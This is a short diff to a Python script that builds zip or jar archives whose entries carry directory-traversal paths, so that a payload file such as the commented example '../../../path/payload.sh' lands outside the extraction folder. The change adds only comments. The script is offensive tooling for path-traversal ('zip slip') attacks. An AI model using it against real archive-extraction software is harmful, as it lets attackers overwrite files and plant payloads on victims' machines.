@@ -27,6 +27,7 @@ def getArguments():
 def createZip(payloadFile,outputFile,traversalPath,completeDir):
     zf = zipfile.ZipFile(outputFile, "w")
     zf.write(payloadFile, traversalPath)
+    # zf.writestr("File Content", "filename")    #Add files directly
 
     if completeDir:
         for foldername, subfolders, filenames in os.walk(completeDir):
@@ -95,7 +96,7 @@ def main():
         if path and path[-1] != '\\':
             path += '\\'
 
-    traversalPath = f"{traversal*depth}{path}{os.path.basename(payloadFile)}"
+    traversalPath = f"{traversal*depth}{path}{os.path.basename(payloadFile)}"    #Directory Traversal Path. Ex: ../../../path/payload.sh
 
     if archiveType == "zip" or archiveType == "jar":
         createZip(payloadFile,outputFile,traversalPath,completeDir)
